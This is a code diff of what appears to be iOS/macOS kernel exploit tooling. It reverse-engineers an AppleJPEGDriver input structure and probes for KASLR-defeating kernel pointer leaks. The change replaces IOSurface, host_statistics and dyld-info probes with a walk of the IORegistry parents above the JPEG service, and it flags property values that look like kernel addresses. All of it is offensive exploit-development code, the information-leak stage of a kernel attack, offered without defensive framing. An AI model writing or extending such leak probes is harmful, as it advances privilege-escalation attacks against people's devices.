@@ -43,6 +43,7 @@ typedef io_object_t io_connect_t;
 typedef io_object_t io_iterator_t;
 
 extern const mach_port_t kIOMainPortDefault;
+#define IO_OBJECT_NULL ((io_object_t)0)
 
 kern_return_t IOServiceGetMatchingServices(mach_port_t mainPort,
                                            CFDictionaryRef matching,
@@ -83,7 +84,10 @@ kern_return_t IORegistryEntryCreateCFProperties(io_object_t entry,
                                                 CFMutableDictionaryRef *properties,
                                                 CFAllocatorRef allocator,
                                                 uint32_t options);
-CF_EXPORT CFDictionaryRef IOSurfaceCopyAllValues(IOSurfaceRef surface);
+kern_return_t IORegistryEntryGetParentIterator(io_object_t entry,
+                                                const char *plane,
+                                                io_iterator_t *iterator);
+extern const char *kIOServicePlane;
 
 // AppleJPEGDriverIOStruct: 0x58 (88) bytes
 // Reverse-engineered from startDecoder (sub_FFFFFE00096470A4) and
@@ -408,6 +412,8 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
         [self log:@""];
         [self log:@"--- Phase 1: Non-driver KASLR leak vectors ---"];
 
+        kern_return_t kr;
+
         // 1a: Dump IORegistry properties of the JPEG service
         {
             CFMutableDictionaryRef props = NULL;
@@ -416,10 +422,8 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
             [self log:@"IORegistry props: kr=0x%x, dict=%s",
                 kr, props ? "YES" : "NO"];
             if (props) {
-                // Convert to NSDictionary for easy iteration
                 NSDictionary *pd = (__bridge_transfer NSDictionary *)props;
                 [self log:@"  %lu entries", (unsigned long)pd.count];
-                // Check each value for kernel-pointer-like patterns
                 for (NSString *key in pd) {
                     id val = pd[key];
                     if ([val isKindOfClass:[NSNumber class]]) {
@@ -427,8 +431,7 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
                         if (v != 0) {
                             uint64_t uv = (uint64_t)v;
                             uint64_t hi = uv >> 40;
-                            [self log:@"  %@ = 0x%016llx%s",
-                                key, uv,
+                            [self log:@"  %@ = 0x%016llx%s", key, uv,
                                 (hi == 0xfffffe || hi == 0xffffff) ? " *** KP" : ""];
                         }
                     } else if ([val isKindOfClass:[NSData class]]) {
@@ -445,75 +448,38 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
             }
         }
 
-        // 1b: IOSurface property probe
+        // 1b: Parent IORegistry properties (IOService plane above JPEG)
         {
-            IOSurfaceRef surf = IOSurfaceCreate(
-                (__bridge CFDictionaryRef)@{
-                    (id)kIOSurfaceWidth: @256,
-                    (id)kIOSurfaceHeight: @1,
-                    (id)kIOSurfaceBytesPerElement: @4,
-                    (id)kIOSurfacePixelFormat: @0x42475241,
-                });
-            if (surf) {
-                CFDictionaryRef sp = IOSurfaceCopyAllValues(surf);
-                if (sp) {
-                    NSDictionary *sd = (__bridge_transfer NSDictionary *)sp;
-                    [self log:@"IOSurface props: %lu entries", (unsigned long)sd.count];
-                    for (NSString *key in sd) {
-                        id val = sd[key];
-                        if ([val isKindOfClass:[NSNumber class]]) {
-                            int64_t v = [(NSNumber *)val longLongValue];
-                            if (v != 0) {
-                                uint64_t uv = (uint64_t)v;
-                                uint64_t hi = uv >> 40;
-                                [self log:@"  %@ = 0x%016llx%s",
-                                    key, uv,
-                                    (hi == 0xfffffe || hi == 0xffffff) ? " *** KP" : ""];
-                            }
-                        } else if ([val isKindOfClass:[NSData class]]) {
-                            NSData *d = (NSData *)val;
-                            if (d.length >= 8) {
-                                uint64_t uv = *(uint64_t *)d.bytes;
-                                uint64_t hi = uv >> 40;
-                                if (hi == 0xfffffe || hi == 0xffffff)
-                                    [self log:@"  %@ = data[%lu] 0x%016llx *** KP",
-                                        key, (unsigned long)d.length, uv];
+            io_iterator_t parents = IO_OBJECT_NULL;
+            kr = IORegistryEntryGetParentIterator(svc, kIOServicePlane, &parents);
+            [self log:@"Parent iter: kr=0x%x", kr];
+            if (kr == KERN_SUCCESS && parents) {
+                io_object_t parent;
+                int pidx = 0;
+                while ((parent = IOIteratorNext(parents)) && pidx < 4) {
+                    CFMutableDictionaryRef pprops = NULL;
+                    kr = IORegistryEntryCreateCFProperties(parent, &pprops,
+                        kCFAllocatorDefault, 0);
+                    if (pprops) {
+                        NSDictionary *pd = (__bridge_transfer NSDictionary *)pprops;
+                        [self log:@"Parent[%d]: %lu entries", pidx, (unsigned long)pd.count];
+                        for (NSString *key in pd) {
+                            id val = pd[key];
+                            if ([val isKindOfClass:[NSNumber class]]) {
+                                int64_t v = [(NSNumber *)val longLongValue];
+                                if (v != 0) {
+                                    uint64_t uv = (uint64_t)v;
+                                    uint64_t hi = uv >> 40;
+                                    if (hi == 0xfffffe || hi == 0xffffff)
+                                        [self log:@"  %@ = 0x%016llx *** KP", key, uv];
+                                }
                             }
                         }
                     }
+                    IOObjectRelease(parent);
+                    pidx++;
                 }
-                CFRelease(surf);
-            }
-        }
-
-        // 1c: host_info / mach primitives that might leak kernel ptrs
-        {
-            mach_port_t host = mach_host_self();
-            // HOST_VM_INFO64 = 5, returns vm_statistics64_data_t
-            vm_statistics64_data_t vmStat;
-            mach_msg_type_number_t count = HOST_VM_INFO64_COUNT;
-            kr = host_statistics64(host, HOST_VM_INFO64,
-                (host_info64_t)&vmStat, &count);
-            [self log:@"host_statistics64: kr=0x%x count=%u", kr, count];
-            if (kr == KERN_SUCCESS) {
-                [self log:@"  free=%llu active=%llu inactive=%llu wire=%llu",
-                    vmStat.free_count, vmStat.active_count,
-                    vmStat.inactive_count, vmStat.wire_count];
-            }
-            mach_port_deallocate(mach_task_self(), host);
-        }
-
-        // 1d: task_info TASK_DYLD_INFO — gives dyld load address (user, but useful)
-        {
-            struct task_dyld_info dyldInfo;
-            mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
-            kr = task_info(mach_task_self(), TASK_DYLD_INFO,
-                (task_info_t)&dyldInfo, &count);
-            [self log:@"TASK_DYLD_INFO: kr=0x%x", kr];
-            if (kr == KERN_SUCCESS) {
-                [self log:@"  all_image_info_addr=0x%llx all_image_info_size=%llu",
-                    dyldInfo.all_image_info_addr,
-                    dyldInfo.all_image_info_size];
+                IOObjectRelease(parents);
             }
         }
 
